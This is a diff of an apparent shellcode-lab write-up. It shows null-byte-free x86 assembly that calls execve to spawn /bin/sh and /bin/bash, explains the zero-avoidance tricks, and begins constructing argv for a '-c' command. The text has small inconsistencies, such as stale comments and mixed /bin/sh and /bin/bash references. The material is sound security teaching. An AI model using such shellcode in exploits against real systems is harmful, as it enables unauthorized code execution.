@@ -217,4 +217,103 @@ There are various techniques that can get rid of zeros in the shell code:
 
   ![bitshift](./img/bitshift.png "bitshift")
 
-  and we see that we have eliminated zeros from the shell code. 
+  We see that the shellcode for the bitshift trick has no zeros.
+
+Going back to the given `mysh.s`, there are four places which use zero without introducing zeros. They are:
+
+```assembly
+; mysh.s
+
+section .text
+  global _start
+    _start:
+      ; Store the argument string on stack
+      xor  eax, eax     ; Clearing eax for (1)
+      push eax          ; (1): want to push /0 onto stack to denote end of string
+      push "//sh"       ; (2): using redundant '/' to avoid zero padding. 
+      push "/bin"       ;
+      mov  ebx, esp     ; 
+
+      ; Construct the argument array argv[]
+      push eax          ; (1): want to push /0 onto stack for arg[1] = 0.
+      push ebx          ; 
+      mov  ecx, esp     ; 
+   
+      ; For environment variable 
+      xor  edx, edx     ; (3): Clearing edx.
+
+      ; Invoke execve()
+      xor  eax, eax     ; 
+      mov   al, 0x0b    ; (4): Settting eax to 0x0b and avoiding zero padding.
+      int 0x80
+```
+
+If we instead want to use the shellcode to execute `/bin/bash`, we will need to make some modifications to `mysh.s`. The edited shell code `mysh_bash.s` is shown below. 
+
+```assembly
+section .text
+  global _start
+    _start:
+      ; Store the argument string on stack
+      xor  eax, eax 
+      mov  al, "h"      ; Store the single character 'h' into eax
+      push eax
+      push "/bas"
+      push "/bin"
+      mov  ebx, esp     ; Get the string address
+
+      ; Construct the argument array argv[]
+      xor  eax, eax     ; Set eax to 0
+      push eax          ; argv[1] = 0
+      push ebx          ; argv[0] points "/bin//sh"
+      mov  ecx, esp     ; Get the address of argv[]
+   
+      ; For environment variable 
+      xor  edx, edx     ; No env variables 
+
+      ; Invoke execve()
+      xor  eax, eax     ; eax = 0x00000000
+      mov   al, 0x0b    ; eax = 0x0000000b
+      int 0x80
+```
+
+Essentially, the problem arises due to the fact that `/bin/bash` is 9 bytes long. The first 8 bytes are easy to push onto the stack. To push the last byte onto the stack, we first store the character `'h'` into the register `eax`. In order to eliminate the zeros, we load it directly into the lowest 8-bit segment `al`. We then push `eax` onto the stack. We subsequently clear `eax` using the XOR method. 
+
+We can use the commands `echo $$` and `echo $SHELL`  to check that `/bin/bash` is indeed running.
+
+![/bin/bash success](./img/mysh_bash.png "/bin/bash success")
+
+We can use `objdump` to verify that the shellcode has no zeros.
+
+![/bin/bash objdump](./img/mysh_bash_objdump.png "/bin/bash objdump")
+
+### 1c: Providing arguments for system calls.
+
+Inside `mysh.s`, the following segment constructs the `argv[]` array for the `execve()` system call. 
+
+```assembly
+; mysh.s: lines 11-14
+
+; Construct the argument array argv[]
+      push eax          ; argv[1] = 0
+      push ebx          ; argv[0] points "/bin//sh"
+      mov  ecx, esp     ; Get the address of argv[]
+```
+Since the command to be executed is `/bin/sh`, without any command-line arguments, our `argv` array only contains **two** elements: first, a pointer to the command string, and second, a zero byte.
+
+Now, we wish to use `execve()` to execute the following command (which uses `/bin/bash` to execute `ls -la`). 
+
+```shell
+~$ /bin/sh -c "ls -la"
+```
+
+Hence, in this new command, the `argv` array should have the following four elements, which all need to be constructed on the stack.
+
+```c
+argv[3] = 0
+argv[2] = "'ls -la'"
+argv[1] = "-c"
+argv[0] = "/bin/sh"
+```
+
+To achieve this, we modify `mysh.s` into the following. 
